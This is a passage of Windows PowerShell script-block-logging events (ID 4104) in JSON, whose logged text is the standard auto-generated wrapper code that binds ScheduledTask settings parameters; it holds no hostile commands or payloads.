${DisallowHardTerminate},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.CompatibilityEnum]\r\n    ${Compatibility},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${DeleteExpiredTaskAfter},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowStartIfOnBatteries},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Disable},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${MaintenanceExclusive},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Hidden},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RunOnlyIfIdle},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${IdleWaitTimeout},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${NetworkId},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${NetworkName},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisallowStartOnRemoteAppSession},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${MaintenancePeriod},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${MaintenanceDeadline},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${StartWhenAvailable},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DontStopIfGoingOnBatteries},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${WakeToRun},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${IdleDuration},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RestartOnIdle},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DontStopOnIdleEnd},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${ExecutionTimeLimit},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.MultipleInstancesEnum]\r\n    ${MultipleInstances},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [int]\r\n    ${Priority},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [int]\r\n    ${RestartCount},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RestartInterval},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RunOnlyIfNetworkAvailable},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectM",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.412991Z"
    },
    "EventRecordID": 81,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 5,
    "MessageTotal": 12,
    "ScriptBlockText": "odelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisallowDemandStart')) {\r\n          [object]$__cmdletization_value = ${DisallowDemandStart}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowDemandStart'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowDemandStart'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisallowHardTerminate')) {\r\n          [object]$__cmdletization_value = ${DisallowHardTerminate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowHardTerminate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowHardTerminate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Compatibility')) {\r\n          [object]$__cmdletization_value = ${Compatibility}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Compatibility'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.CompatibilityEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Compatibility'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.CompatibilityEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DeleteExpiredTaskAfter')) {\r\n          [object]$__cmdletization_value = ${DeleteExpiredTaskAfter}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DeleteExpiredTaskAfter'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DeleteExpiredTaskAfter'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowStartIfOnBatteries')) {\r\n          [object]$__cmdletization_value = ${AllowStartIfOnBatteries}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowStartIfOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowStartIfOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Disable')) {\r\n          [object]$__cmdletization_value = ${Disable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Disable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Disable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MaintenanceExclusive')) {\r\n          [object]$__cmdletization_value = ${MaintenanceExclusive}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceExclusive'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceExclusive'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Hidden')) {\r\n          [object]$__cmdletization_value = ${Hidden}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Hidden'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Hidden'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunOnlyIfIdle')) {\r\n          [object]$__cmdletization_value = ${RunOnlyIfIdle}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IdleWaitTimeout')) {\r\n          [object]$__cmdletization_value = ${IdleWaitTimeout}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleWaitTimeout'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleWaitTimeout'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkId')) {\r\n          [object]$__cmdletization_value = ${NetworkId}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkName')) {\r\n          [object]$__cmdletization_value = ${NetworkName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisallowStartOnRemoteAppSession')) {\r\n          [object]$__cmdletization_value = ${DisallowStartOnRemoteAppSession}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowStartOnRemoteAppSession'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowStartOnRemoteAppSession'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MaintenancePeriod')) {\r\n          [object]$__cmdletization_value = ${MaintenancePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenancePeriod'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenancePeriod'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MaintenanceDeadline')) {\r\n          [object]$__cmdletization_value = ${MaintenanceDeadline}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceDeadline'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceDeadline'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('StartWhenAvailable')) {\r\n          [object]$__cmdletization_value = ${StartWhenAvailable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StartWhenAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StartWhenAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DontStopIfGoingOnBatteries')) {\r\n          [object]$__cmdletization_value = ${DontStopIfGoingOnBatteries}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopIfGoingOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopIfGoingOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('WakeToRun')) {\r\n          [object]$__cmdletization_value = ${WakeToRun}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WakeToRun'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WakeToRun'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IdleDuration')) {\r\n          [object]$__cmdletization_value = ${IdleDuration}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n ",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413012Z"
    },
    "EventRecordID": 82,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 6,
    "MessageTotal": 12,
    "ScriptBlockText": "       [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RestartOnIdle')) {\r\n          [object]$__cmdletization_value = ${RestartOnIdle}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartOnIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartOnIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DontStopOnIdleEnd')) {\r\n          [object]$__cmdletization_value = ${DontStopOnIdleEnd}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopOnIdleEnd'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopOnIdleEnd'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExecutionTimeLimit')) {\r\n          [object]$__cmdletization_value = ${ExecutionTimeLimit}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExecutionTimeLimit'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExecutionTimeLimit'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MultipleInstances')) {\r\n          [object]$__cmdletization_value = ${MultipleInstances}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MultipleInstances'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.MultipleInstancesEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MultipleInstances'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.MultipleInstancesEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Priority')) {\r\n          [object]$__cmdletization_value = ${Priority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Priority'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Priority'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RestartCount')) {\r\n          [object]$__cmdletization_value = ${RestartCount}\r\n          $__cmdletization_methodParameter = 